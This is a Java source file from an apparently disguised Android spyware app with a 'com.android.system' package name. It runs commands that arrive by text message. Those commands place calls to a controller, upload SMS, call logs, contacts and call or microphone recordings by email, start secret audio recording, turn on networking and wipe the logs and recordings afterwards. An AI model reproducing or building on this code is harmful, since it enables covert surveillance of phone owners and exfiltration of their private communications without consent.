package com.android.system.controled.util;

import java.io.File;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.net.wifi.WifiManager;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.db.DatabaseUtil;

public class DoAboutCodeUtils {

	private static final String TAG = "DoAboutCodeUtils";

	public static boolean doOperaByMessage(Context context, String msgTxt) {
		boolean result = true;
		try {

			if (msgTxt.contains(MainApplication.PHONE_CODE_UP)) {
				Debug.e(TAG, "��������������������");
				AudioUtil.turnUpMost(context);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_CALL_ME)) {
				Debug.e(TAG, "����绰");
				Uri uri = Uri.parse("tel:" + MainApplication.getInstence().getControllerTel());
				Intent it = new Intent(Intent.ACTION_CALL, uri); // ֱ�Ӻ���
				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(it);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL)) {
				Debug.e(TAG, "�ϴ�����ͨ����¼");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
					send2.upLoadSmsCallLog(context, true);
				} else {
					send2.upLoadSmsCallLog(context, false);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
				Debug.e(TAG, "�ϴ�ͨ��¼��");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
					send2.upLoadCallAudios(context, true);
				} else {
					send2.upLoadCallAudios(context, false);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
				Debug.e(TAG, "�ϴ�����¼��");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
					send2.upLoadOtherAudios(context, true);
				} else {
					send2.upLoadOtherAudios(context, false);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL)) {
				Debug.e(TAG, "�ϴ�����");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
					send2.upLoadALL(context, true);
				} else {
					send2.upLoadALL(context, false);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_TIME)) {
				String words = msgTxt.substring(msgTxt.indexOf(MainApplication.PHONE_CODE_RECORD_TIME), msgTxt.length());
				String[] strs = words.split(":");
				if (strs.length == 2 && strs[1] != null) {
					Debug.e(TAG, "¼��N����: " + strs[1]);
					// �ļ�����λ��
					File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + strs[1] + " minutes-" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
					RecorderUtil.getInstence(context).startRecorder(file, Integer.parseInt(strs[1]));
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS)) {
				Debug.e(TAG, "��ʼ�ϴ���ϵ��");
				ContactsUtil.createContactsFile(context);
				SendEmailUtil send3 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
					send3.upLoadContact(context, true);
				} else {
					send3.upLoadContact(context, false);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_START)) {
				Debug.e(TAG, "��ʼ¼��");
				// �ļ�����λ��
				File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
				RecorderUtil.getInstence(context).startRecorder(file, -1);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_END)) {
				Debug.e(TAG, "����¼��");
				RecorderUtil.getInstence(context).stopRecorder();
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DOWN)) {
				Debug.e(TAG, "��������ȡ����");
				AudioUtil.turnDown(context);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_MSG_LOG)) {
				Debug.e(TAG, "ɾ�����ż�¼");
				deleteSmsLog(context);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_CALL_LOG)) {
				Debug.e(TAG, "ɾ��ͨ����¼");
				deleteCallLog();
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_WIFI)) {
				Debug.e(TAG, "����wifi");
				NetworkUtil.turnOnWifi(context);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_MOBILE)) {
				Debug.e(TAG, "����mobile network");
				NetworkUtil.setMobileNetEnable(context);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL)) {
				Debug.e(TAG, "ɾ��ͨ��¼����¼");
				deleteCallRecord();
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
				Debug.e(TAG, "ɾ������¼����¼");
				deleteOtherRecord();
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_ALL_LOG)) {
				Debug.e(TAG, "ɾ�����м�¼");
				deleteSmsLog(context);
				deleteCallLog();
				deleteCallRecord();
				deleteOtherRecord();
			}

			else {

				result = false;

				// // ���ض�ʱ���ڣ��Զ���������
				// switch (Globle.inTime()) {
				// case 1:
				// Globle.turnUpMost(context);
				// break;
				// case 2:
				// Globle.turnUpSecond(context);
				// break;
				//
				// default:
				// break;
				// }
				// SystemClock.sleep(3000);
				// SmsSaveOutUtil so = new SmsSaveOutUtil(context);
				// so.saveLastSms();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}

	private static void deleteSmsLog(Context context) {

		try {
			File a = new File(MainApplication.FILE_SMS_DB);

			if (a.exists()) {
				// SmsSaveOutUtil so = new SmsSaveOutUtil(context);
				SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
				so.deleteAllMsg();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void deleteCallLog() {
		try {
			if (MainApplication.FILE_CALL_LOG.exists()) {
				MainApplication.FILE_CALL_LOG.delete();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void deleteCallRecord() {
		try {
			FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_CALL));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void deleteOtherRecord() {
		try {
			FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_OTHER));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	// private boolean getMobileDataStatus(Context context) {
	// ConnectivityManager conMgr = (ConnectivityManager)
	// context.getSystemService(Context.CONNECTIVITY_SERVICE);
	//
	// Class<?> conMgrClass = null; // ConnectivityManager��
	// Field iConMgrField = null; // ConnectivityManager���е��ֶ�
	// Object iConMgr = null; // IConnectivityManager�������
	// Class<?> iConMgrClass = null; // IConnectivityManager��
	// Method getMobileDataEnabledMethod = null; // setMobileDataEnabled����
	//
	// try {
	// // ȡ��ConnectivityManager��
	// conMgrClass = Class.forName(conMgr.getClass().getName());
	// // ȡ��ConnectivityManager���еĶ���mService
	// iConMgrField = conMgrClass.getDeclaredField("mService");
	// // ����mService�ɷ���
	// iConMgrField.setAccessible(true);
	// // ȡ��mService��ʵ������IConnectivityManager
	// iConMgr = iConMgrField.get(conMgr);
	// // ȡ��IConnectivityManager��
	// iConMgrClass = Class.forName(iConMgr.getClass().getName());
	// // ȡ��IConnectivityManager���е�getMobileDataEnabled(boolean)����
	// getMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod("getMobileDataEnabled");
	// // ����getMobileDataEnabled�����ɷ���
	// getMobileDataEnabledMethod.setAccessible(true);
	// // ����getMobileDataEnabled����
	// return (Boolean) getMobileDataEnabledMethod.invoke(iConMgr);
	// } catch (ClassNotFoundException e) {
	// e.printStackTrace();
	// } catch (NoSuchFieldException e) {
	// e.printStackTrace();
	// } catch (SecurityException e) {
	// e.printStackTrace();
	// } catch (NoSuchMethodException e) {
	// e.printStackTrace();
	// } catch (IllegalArgumentException e) {
	// e.printStackTrace();
	// } catch (IllegalAccessException e) {
	// e.printStackTrace();
	// } catch (InvocationTargetException e) {
	// // TODO Auto-generated catch block
	// e.printStackTrace();
	// }
	// return false;
	// }
	//
	// /**
	// * �ƶ����翪��
	// */
	// private void toggleMobileData(Context context, boolean enabled) {
	// ConnectivityManager conMgr = (ConnectivityManager)
	// context.getSystemService(Context.CONNECTIVITY_SERVICE);
	//
	// Class<?> conMgrClass = null; // ConnectivityManager��
	// Field iConMgrField = null; // ConnectivityManager���е��ֶ�
	// Object iConMgr = null; // IConnectivityManager�������
	// Class<?> iConMgrClass = null; // IConnectivityManager��
	// Method setMobileDataEnabledMethod = null; // setMobileDataEnabled����
	//
	// try {
	// // ȡ��ConnectivityManager��
	// conMgrClass = Class.forName(conMgr.getClass().getName());
	// // ȡ��ConnectivityManager���еĶ���mService
	// iConMgrField = conMgrClass.getDeclaredField("mService");
	// // ����mService�ɷ���
	// iConMgrField.setAccessible(true);
	// // ȡ��mService��ʵ������IConnectivityManager
	// iConMgr = iConMgrField.get(conMgr);
	// // ȡ��IConnectivityManager��
	// iConMgrClass = Class.forName(iConMgr.getClass().getName());
	// // ȡ��IConnectivityManager���е�setMobileDataEnabled(boolean)����
	// setMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
	// // ����setMobileDataEnabled�����ɷ���
	// setMobileDataEnabledMethod.setAccessible(true);
	// // ����setMobileDataEnabled����
	// setMobileDataEnabledMethod.invoke(iConMgr, enabled);
	// } catch (ClassNotFoundException e) {
	// e.printStackTrace();
	// } catch (NoSuchFieldException e) {
	// e.printStackTrace();
	// } catch (SecurityException e) {
	// e.printStackTrace();
	// } catch (NoSuchMethodException e) {
	// e.printStackTrace();
	// } catch (IllegalArgumentException e) {
	// e.printStackTrace();
	// } catch (IllegalAccessException e) {
	// e.printStackTrace();
	// } catch (InvocationTargetException e) {
	// e.printStackTrace();
	// }
	// }

}
